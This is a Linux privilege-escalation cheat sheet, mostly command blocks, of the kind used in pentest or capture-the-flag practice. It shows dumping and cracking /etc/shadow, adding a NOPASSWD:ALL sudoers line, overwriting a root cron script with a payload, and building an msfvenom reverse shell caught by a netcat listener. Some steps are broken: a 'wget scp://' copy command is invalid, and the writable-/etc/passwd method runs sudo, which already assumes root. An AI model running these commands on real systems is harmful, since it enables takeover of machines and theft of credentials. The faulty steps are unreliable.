# Linux  Privilege Escalation

### **Exploit SUDO Permissions**

***

Check SUDO permissions:

```bash
sudo -l
```

Identify a binary or command with "NOPASSWD" permission.

Refer to [GTFOBins](https://gtfobins.github.io/) for possible privilege escalation techniques.

### **Exploit SSH Private Key**

***

Find and exploit SSH private key:

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
ls -la /
```

Set up SSH with the private key

```bash
chmod 600 root_key 
ssh -i root_key root@10.10.10.10
```

### **Exploit Readable /etc/passwd and /etc/shadow**

***

**Check Permissions**

```bash
ls -la /etc/passwd 
ls -la /etc/shadow 
cat /etc/passwd 
cat /etc/shadow
```

**Copy Files Locally**

```bash
# Using scp
scp user@remote_server:/etc/passwd /path/to/local/directory
scp user@remote_server:/etc/shadow /path/to/local/directory

# Using wget
wget scp://user@remote_server:/etc/passwd -O /path/to/local/directory/passwd
wget scp://user@remote_server:/etc/shadow -O /path/to/local/directory/shadow
```

**Unshadow Passwords**

```bash
unshadow /path/to/local/directory/passwd /path/to/local/directory/shadow > /path/to/local/directory/unshadowed.txt
```

**Crack Password Hashes**

```bash
hashcat -m [hash_type] -a 0 /path/to/local/directory/unshadowed.txt /path/to/wordlist.txt
```

### **Exploit Writable /etc/passwd**

***

Check permissions:

```bash
ls -lah /etc/passwd
```

Add a user with root privileges.

```bash
# Add a new user
sudo useradd -m -G sudo newuser

# Set a password for the new user
sudo passwd newuser
```

Create a password hash and update /etc/passwd.

```bash
# Generate a password hash (replace 'your_password' with the actual password)
openssl passwd -1 your_password
```

Copy the generated hash.

Next, edit the **`/etc/passwd`** file to update the user's password hash

```bash
newuser:x:1001:1001::/home/newuser:/bin/bash
```

Switch to the created user.

```bash
su newuser
```

### **Exploit Writable /etc/shadow**

***

Check writable permissions:

```bash
ls -l /etc/shadow
```

Generate a new password hash and update /etc/shadow.

```bash
openssl passwd -1
```

Update /etc/shadow

```bash
sudo nano /etc/shadow
```

Locate the entry for the user you want to update, replace the old password hash with the new one, and save the file.

### **Exploit Writable /etc/sudoers**

***

Check writable permissions:

```bash
ls -l /etc/sudoers
```

Use SUDO without a password by modifying the sudoers file.

```bash
sudo visudo
```

This will open the **`sudoers`** file in a text editor. Add the following line to permit a specific user (replace **`username`** with the actual username) to run any command without a password prompt.

```bash
username ALL=(ALL:ALL) NOPASSWD:ALL
```

For a specific group (replace **`groupname`** with the actual group name)

```bash
%groupname ALL=(ALL:ALL) NOPASSWD:ALL
```

### **Exploit SUID/SGID**

***

Find SUID binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Search for exploits on [GTFOBins](https://gtfobins.github.io/).

### **Exploit Capabilities**

***

Find files with capabilities:

```bash
getcap -r / 2>/dev/null
```

Refer to [GTFOBins](https://gtfobins.github.io/) for exploit ideas.

### **Exploit CronJob File Permissions**

***

View the contents of cron jobs:

```bash
cat /etc/crontab
```

Locate the full path of the target script.

```bash
cat /etc/crontab | grep "/your_script_name.sh"
```

Check writable permissions.

```bash
ls -l /path/to/your_script_name.sh
```

Replace the script with a malicious payload.

```bash
echo -e "malicious_payload_here" > /path/to/your_script_name.sh
```

Set up a Netcat listener.

```bash
nc -l -p your_port_number -vvv
```

### **Exploit Kernel**

***

Run a kernel exploitation script or check the kernel version.

```bash
uname -r
```

Search for exploits using `searchsploit` or online resources.

Compile and execute any applicable code.

### **Exploit CronJob Wildcard**

***

View the contents of the cron job script.

```bash
cat /path/to/cronjob/script
```

Exploit a command execution vulnerability, possibly using GTFOBins techniques.

Generate a reverse shell binary.

```bash
msfvenom -p [payload] LHOST=[your IP] LPORT=[your port] -f elf -o reverse_shell
```

Transfer the binary and make it executable.

```bash
chmod +x reverse_shell
```

Create the necessary files to trigger the exploit.

Set up a Netcat listener.

```bash
nc -lvnp [your listening port]
```
